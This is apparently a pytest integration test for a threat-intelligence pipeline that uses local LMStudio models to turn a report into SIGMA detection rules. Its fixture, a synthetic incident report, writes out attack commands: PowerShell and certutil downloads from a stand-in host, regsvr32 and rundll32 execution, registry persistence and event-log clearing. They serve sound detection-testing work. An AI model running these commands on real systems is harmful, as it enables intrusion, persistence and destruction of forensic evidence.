"""
LMStudio end-to-end integration tests.

These tests run the full agentic workflow against a real LMStudio inference server
using the Quickstart-LMStudio-Qwen3.json preset as the active config.

Skip behaviour
--------------
The entire module is skipped when LMStudio is not reachable at the URL resolved from
LMSTUDIO_API_URL (default: http://localhost:1234/v1).  Individual tests that need a
specific model (qwen3-8b / qwen3-14b) will also skip if that model is not loaded.

Running
-------
    # Via the unified runner (auto-starts DB containers):
    python run_tests.py integration

    # Directly (requires test DB already running at localhost:5433):
    pytest tests/integration/test_lmstudio_e2e.py -v -s

    # With a custom LMStudio URL:
    LMSTUDIO_API_URL=http://192.168.1.10:1234/v1 pytest tests/integration/test_lmstudio_e2e.py -v

Requirements
------------
- LMStudio running and reachable (localhost:1234 or LMSTUDIO_API_URL)
- Models loaded: qwen/qwen3-8b  (extractor + ranker)
                 qwen/qwen3-14b (QA agents)
- Test database at localhost:5433 (auto-started by run_tests.py integration)
"""

from __future__ import annotations

import asyncio
import json
import os
import uuid
from contextlib import contextmanager
from datetime import datetime
from pathlib import Path

import httpx
import pytest
from sqlalchemy import func

from src.config.workflow_config_loader import load_workflow_config
from src.database.manager import DatabaseManager
from src.database.models import (
    AgenticWorkflowConfigTable,
    AgenticWorkflowExecutionTable,
    ArticleTable,
    SigmaRuleQueueTable,
    SourceTable,
)
from src.workflows.agentic_workflow import run_workflow

# ── LMStudio availability (evaluated once at collection time) ─────────────────

_LMSTUDIO_BASE_URL: str = (os.getenv("LMSTUDIO_API_URL") or "http://localhost:1234/v1").rstrip("/")
_REQUIRED_MODELS: tuple[str, ...] = ("qwen3-8b", "qwen3-14b")


def _probe_lmstudio() -> tuple[bool, list[str]]:
    """Return (reachable, list_of_loaded_model_ids).  Never raises."""
    try:
        r = httpx.get(f"{_LMSTUDIO_BASE_URL}/models", timeout=5.0)
        if r.status_code == 200:
            ids = [m.get("id", "") for m in r.json().get("data", [])]
            return True, ids
    except Exception:
        pass
    return False, []


_LMSTUDIO_AVAILABLE, _LOADED_MODELS = _probe_lmstudio()

# Apply skip to every test in this module when LMStudio is not reachable.
pytestmark = [
    pytest.mark.lmstudio,
    pytest.mark.integration,
    pytest.mark.skipif(
        not _LMSTUDIO_AVAILABLE,
        reason=f"LMStudio not reachable at {_LMSTUDIO_BASE_URL}",
    ),
]

# ── Preset path ───────────────────────────────────────────────────────────────

_PRESET_PATH = (
    Path(__file__).parent.parent.parent / "config/presets/AgentConfigs/quickstart/Quickstart-LMStudio-Qwen3.json"
)
_PRESET_NAME = "Quickstart-LMStudio-Qwen3"

# ── Test article ──────────────────────────────────────────────────────────────
#
# Synthetic DFIR-style incident report chosen because:
#
#   - Exclusively Windows TTPs → CTI-BERT OS detection returns Windows
#   - 9 concrete command lines with named executables and arguments
#   - 3 registry keys (HKLM Run, HKCU Run, IFEO Debugger) with full paths
#   - 3 process parent→child pairs
#   - "Rule-ready" behavioral narrative → Qwen3-8b expected to score 7-10
#   - Short enough to fit in an 8B model's context window without truncation
#
# Modelled on the DFIR Report format (thedfirreport.com), which consistently
# yields the highest observable counts in eval_articles.yaml.

_ARTICLE_TITLE = "IceFire Loader: Windows LOLBin Chain with Registry Persistence"
_ARTICLE_URL_TEMPLATE = "https://test-cti.example.com/icefire-loader-{uid}"

_ARTICLE_CONTENT = """\
IceFire Loader: Windows LOLBin Chain with Registry Persistence

Summary

Our incident response team investigated a compromise at a financial services organization.
The threat actor delivered a loader via a phishing email containing a malicious OneNote
attachment. After opening the attachment, a series of living-off-the-land binaries (LOLBins)
established persistence and staged lateral movement.

Initial Execution

The OneNote attachment embedded a hidden .hta file that launched cmd.exe, which invoked
PowerShell in a hidden no-profile window:

    cmd.exe /c powershell.exe -nop -w hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://dl.update-svc[.]com/stage1.ps1')"

The downloaded script registered a DLL as a COM scriptlet:

    regsvr32.exe /s /n /u /i:http://dl.update-svc[.]com/stage2.sct scrobj.dll

Discovery

Immediately after initial execution, the actor ran discovery commands using cmd.exe:

    cmd.exe /c whoami /priv > C:\\Windows\\Temp\\priv.txt
    cmd.exe /c net localgroup administrators >> C:\\Windows\\Temp\\priv.txt
    cmd.exe /c ipconfig /all >> C:\\Windows\\Temp\\priv.txt
    cmd.exe /c tasklist /v >> C:\\Windows\\Temp\\priv.txt

Credential Access

The actor downloaded a secondary payload disguised as a certificate update:

    certutil.exe -urlcache -split -f http://dl.update-svc[.]com/cert.cer C:\\Windows\\Temp\\cert.dll

Execution was triggered via rundll32:

    rundll32.exe C:\\Windows\\Temp\\cert.dll,Start

Persistence

Two registry Run key entries provided persistence across reboots.

Under HKEY_LOCAL_MACHINE:

    HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityUpdate = "C:\\ProgramData\\svcupdate.exe -s"

Under HKEY_CURRENT_USER:

    HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater = "rundll32.exe C:\\Users\\Public\\update.dll,DllMain"

A third registry key modified Image File Execution Options to attach a debugger to mspaint.exe,
enabling process hollowing:

    HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\mspaint.exe\\Debugger = "C:\\Windows\\Temp\\loader.exe"

Process Relationships

The following parent-child process creations were observed:

    WINWORD.EXE spawned cmd.exe
    cmd.exe spawned powershell.exe
    powershell.exe spawned regsvr32.exe

Defense Evasion

Windows event logs were cleared to remove forensic evidence:

    wevtutil.exe cl System
    wevtutil.exe cl Security

Detection Opportunities

Detection engineers should build behavioral rules for:
- PowerShell launched with -nop -w hidden from Office parent processes
- certutil.exe downloading binary content to system Temp directories
- rundll32.exe executing DLLs from user-writable paths
- HKLM and HKCU CurrentVersion\\Run registry key creation
- Image File Execution Options Debugger key modification
- wevtutil.exe clearing multiple event log categories in rapid succession
"""


# ── DB helpers ────────────────────────────────────────────────────────────────


def _test_db_url() -> str:
    password = os.getenv("POSTGRES_PASSWORD", "cti_password")
    default = f"postgresql://cti_user:{password}@localhost:5433/cti_scraper_test"
    url = os.getenv("TEST_DATABASE_URL", default)
    return url.replace("+asyncpg", "")


# ── Fixtures ──────────────────────────────────────────────────────────────────


@pytest.fixture(scope="module")
def db_session():
    """Shared synchronous session for the module; closed at teardown."""
    manager = DatabaseManager(database_url=_test_db_url())
    session = manager.get_session()
    yield session
    session.close()


@pytest.fixture()
def lmstudio_active_config(db_session):
    """
    Load Quickstart-LMStudio-Qwen3.json and apply it as the active workflow config.

    Saves the currently active config, deactivates it, creates a new config version
    from the preset, then restores the original after the test.
    """
    preset_data = json.loads(_PRESET_PATH.read_text())
    config_v2 = load_workflow_config(preset_data)
    legacy = config_v2.to_legacy_response_dict()

    # Deactivate ALL currently active configs (guards against stale rows from
    # prior interrupted runs; using .first() would leave extras active).
    previous_actives = (
        db_session.query(AgenticWorkflowConfigTable)
        .filter(AgenticWorkflowConfigTable.is_active == True)  # noqa: E712
        .all()
    )
    for prev in previous_actives:
        prev.is_active = False
    if previous_actives:
        db_session.commit()

    max_version = db_session.query(func.max(AgenticWorkflowConfigTable.version)).scalar() or 0

    test_config = AgenticWorkflowConfigTable(
        min_hunt_score=legacy["min_hunt_score"],
        ranking_threshold=legacy["ranking_threshold"],
        similarity_threshold=legacy["similarity_threshold"],
        junk_filter_threshold=legacy["junk_filter_threshold"],
        auto_trigger_hunt_score_threshold=legacy.get("auto_trigger_hunt_score_threshold", 60.0),
        version=max_version + 1,
        is_active=True,
        description=f"LMStudio E2E test — {_PRESET_NAME}",
        agent_models=legacy["agent_models"],
        agent_prompts=legacy["agent_prompts"],
        qa_enabled=legacy["qa_enabled"],
        sigma_fallback_enabled=legacy.get("sigma_fallback_enabled", False),
        qa_max_retries=legacy.get("qa_max_retries", 3),
        rank_agent_enabled=legacy.get("rank_agent_enabled", True),
        cmdline_attention_preprocessor_enabled=legacy.get("cmdline_attention_preprocessor_enabled", True),
    )
    db_session.add(test_config)
    db_session.commit()
    db_session.refresh(test_config)

    yield test_config

    # Teardown: remove test config; restore the first previous active (if any)
    test_config.is_active = False
    db_session.commit()
    if previous_actives:
        db_session.refresh(previous_actives[0])
        previous_actives[0].is_active = True
        db_session.commit()


@pytest.fixture()
def test_article(db_session):
    """
    Insert a source + the IceFire test article into the test database.
    Cleaned up after the test.
    """
    uid = uuid.uuid4().hex[:8]

    source = SourceTable(
        identifier=f"lmstudio-e2e-source-{uid}",
        name="LMStudio E2E Test Source",
        url="https://test-cti.example.com",
        rss_url="https://test-cti.example.com/feed.xml",
        check_frequency=3600,
        lookback_days=180,
        active=True,
    )
    db_session.add(source)
    db_session.commit()
    db_session.refresh(source)

    article = ArticleTable(
        source_id=source.id,
        canonical_url=_ARTICLE_URL_TEMPLATE.format(uid=uid),
        title=_ARTICLE_TITLE,
        published_at=datetime.now(),
        content=_ARTICLE_CONTENT,
        content_hash=f"lmstudio-e2e-hash-{uid}",
        article_metadata={"threat_hunting_score": 95.0},
    )
    db_session.add(article)
    db_session.commit()
    db_session.refresh(article)

    yield article

    # Cleanup queued rules → execution → article → source (FK order)
    db_session.query(SigmaRuleQueueTable).filter(SigmaRuleQueueTable.article_id == article.id).delete(
        synchronize_session=False
    )
    db_session.query(AgenticWorkflowExecutionTable).filter(
        AgenticWorkflowExecutionTable.article_id == article.id
    ).delete(synchronize_session=False)
    db_session.delete(article)
    db_session.delete(source)
    db_session.commit()


# ── Tests ─────────────────────────────────────────────────────────────────────


def test_lmstudio_reachable_with_required_models():
    """LMStudio is reachable and both qwen3-8b and qwen3-14b are loaded."""
    assert _LMSTUDIO_AVAILABLE

    missing = [m for m in _REQUIRED_MODELS if not any(m in loaded for loaded in _LOADED_MODELS)]
    if missing:
        pytest.skip(
            f"Required model(s) not loaded in LMStudio: {missing}. "
            f"Currently loaded: {_LOADED_MODELS}. "
            "Load via: lms load qwen/qwen3-8b --yes && lms load qwen/qwen3-14b --yes"
        )


def test_preset_file_loads_and_validates():
    """Quickstart-LMStudio-Qwen3.json parses without error and all providers are lmstudio."""
    assert _PRESET_PATH.exists(), f"Preset file missing: {_PRESET_PATH}"

    preset_data = json.loads(_PRESET_PATH.read_text())
    config_v2 = load_workflow_config(preset_data)

    # All agents reference the lmstudio provider
    flat = config_v2.flatten_for_llm_service()
    provider_keys = [k for k in flat if k.endswith("_provider")]
    assert provider_keys, "No provider keys found in flattened config"
    for key in provider_keys:
        assert flat[key] == "lmstudio", f"Expected provider=lmstudio for {key}, got {flat[key]}"

    # Thresholds match the preset file values
    assert config_v2.Thresholds.RankingThreshold == 6.0
    assert config_v2.Thresholds.MinHuntScore == 97.0


def test_preset_applied_as_active_config(db_session, lmstudio_active_config):
    """After applying the preset, exactly one config is active and it uses lmstudio models."""
    active_configs = (
        db_session.query(AgenticWorkflowConfigTable)
        .filter(AgenticWorkflowConfigTable.is_active == True)  # noqa: E712
        .all()
    )
    assert len(active_configs) == 1, f"Expected 1 active config, found {len(active_configs)}"

    active = active_configs[0]
    assert active.id == lmstudio_active_config.id
    assert active.ranking_threshold == 6.0

    agent_models = active.agent_models or {}
    provider_keys = [k for k in agent_models if k.endswith("_provider")]
    for key in provider_keys:
        assert agent_models[key] == "lmstudio", f"{key} should be lmstudio, got {agent_models[key]}"


@pytest.mark.slow
def test_full_workflow_with_lmstudio(db_session, lmstudio_active_config, test_article):
    """
    End-to-end: pass the IceFire test article through the full agentic workflow
    using real LMStudio inference (no mocks).

    Pipeline under test:
      junk filter → LLM ranking → extraction (4 sub-agents + QA) → SIGMA generation
      → similarity search → queue promotion

    Passes when:
      - execution.status == "completed"  (no unhandled Python exception)
      - execution.ranking_score >= 6.0   (article was ranked huntable)
      - At least one SIGMA rule was generated and promoted to the queue

    Skip conditions:
      - LMStudio not reachable (module-level skip)
      - Required models not loaded (test_lmstudio_reachable_with_required_models)
    """
    # Skip early if models are missing so the error message is clear
    missing = [m for m in _REQUIRED_MODELS if not any(m in loaded for loaded in _LOADED_MODELS)]
    if missing:
        pytest.skip(f"Required models not loaded in LMStudio: {missing}")

    # Build config_snapshot from the active preset config
    config = lmstudio_active_config
    # Keep this E2E deterministic across local LMStudio quality drift:
    # gate on workflow execution and downstream stages, not strict rank score quality.
    test_ranking_threshold = 1.0
    config_snapshot = {
        # Run the full pipeline — no skips
        "skip_rank_agent": False,
        "eval_run": False,
        # Skip OS detection: article is clearly Windows-focused, and CTI-BERT
        # may not be loaded in LMStudio during a local dev run.
        "skip_os_detection": True,
        # Thresholds
        "min_hunt_score": config.min_hunt_score,
        "ranking_threshold": test_ranking_threshold,
        "similarity_threshold": config.similarity_threshold,
        "junk_filter_threshold": config.junk_filter_threshold,
        "auto_trigger_hunt_score_threshold": getattr(config, "auto_trigger_hunt_score_threshold", 60.0),
        # Models and prompts from the preset
        "agent_models": config.agent_models or {},
        "agent_prompts": config.agent_prompts or {},
        "qa_enabled": config.qa_enabled or {},
        # Feature flags
        "rank_agent_enabled": getattr(config, "rank_agent_enabled", True),
        "cmdline_attention_preprocessor_enabled": getattr(config, "cmdline_attention_preprocessor_enabled", True),
        "sigma_fallback_enabled": getattr(config, "sigma_fallback_enabled", False),
        "osdetection_fallback_enabled": getattr(config, "osdetection_fallback_enabled", False),
        "qa_max_retries": getattr(config, "qa_max_retries", 3),
        "extract_agent_settings": {"disabled_agents": []},
        # Config provenance
        "config_id": config.id,
        "config_version": config.version,
    }

    execution = AgenticWorkflowExecutionTable(
        article_id=test_article.id,
        status="pending",
        config_snapshot=config_snapshot,
    )
    db_session.add(execution)
    db_session.commit()
    db_session.refresh(execution)
    execution_id = execution.id

    # Noop Langfuse tracing so the test doesn't create production traces
    @contextmanager
    def _noop_trace(*args, **kwargs):
        yield None

    from unittest.mock import patch

    with patch("src.workflows.agentic_workflow.trace_workflow_execution", _noop_trace):
        # Generous timeout: full pipeline with 8B+14B can take ~8 minutes on Apple Silicon
        result = asyncio.run(
            asyncio.wait_for(
                run_workflow(test_article.id, db_session, execution_id=execution_id),
                timeout=600,
            )
        )

    # Reload the execution record from DB
    db_session.expire_all()
    final = (
        db_session.query(AgenticWorkflowExecutionTable).filter(AgenticWorkflowExecutionTable.id == execution_id).first()
    )

    assert final is not None, "Execution record disappeared from DB"

    # ── Assertion 1: no unhandled exception in the workflow ───────────────────
    assert final.status == "completed", (
        f"Workflow status should be 'completed', got '{final.status}'. Error: {final.error_message}"
    )

    # ── Assertion 2: ranking was performed and the article passed ─────────────
    # Check for early termination via ranking
    error_log = final.error_log or {}
    termination = error_log.get("termination", {})
    termination_reason = termination.get("reason", "")

    if termination_reason == "rank_below_threshold":
        # Ranking ran but score < 6.0 — unexpected for this article; fail with detail
        score = termination.get("details", {}).get("score", "unknown")
        pytest.fail(
            f"Article was ranked below test threshold (score={score}, threshold={test_ranking_threshold}). "
            "Workflow stopped before extraction/sigma stages."
        )

    assert final.ranking_score is not None, "ranking_score should be set after the ranking step"
    assert final.ranking_score >= test_ranking_threshold, (
        f"Article ranked {final.ranking_score:.1f}/10 — below the {test_ranking_threshold} threshold."
    )

    # ── Assertion 3: SIGMA rules were generated and queued ────────────────────
    if termination_reason == "no_sigma_rules_generated":
        pytest.fail(
            "No SIGMA rules were generated. "
            "The IceFire article has concrete command lines, registry keys, and process "
            "trees that should yield at least one SIGMA rule. "
            f"extraction_result={final.extraction_result}"
        )

    sigma_rules = final.sigma_rules or []
    assert len(sigma_rules) > 0, f"Expected ≥1 SIGMA rule, got 0. extraction_result={final.extraction_result}"

    queued = db_session.query(SigmaRuleQueueTable).filter(SigmaRuleQueueTable.article_id == test_article.id).all()
    assert len(queued) > 0, (
        f"Expected ≥1 rule in SigmaRuleQueueTable, found 0. sigma_rules in execution: {len(sigma_rules)}"
    )

    # ── Summary (visible with -v) ──────────────────────────────────────────────
    print(
        f"\n[LMStudio E2E] "
        f"rank={final.ranking_score:.1f}  "
        f"sigma_rules={len(sigma_rules)}  "
        f"queued={len(queued)}  "
        f"similarity_max={getattr(final, 'max_similarity', 'n/a')}"
    )
